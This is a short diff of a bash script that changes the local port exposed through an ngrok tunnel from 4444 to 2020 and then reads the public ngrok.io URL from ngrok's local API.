@@ -57,7 +57,7 @@ echo ""
                   sleep 3
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
-                  ./ngrok http 4444 > /dev/null 2>&1 &
+                  ./ngrok http 2020 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
                   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
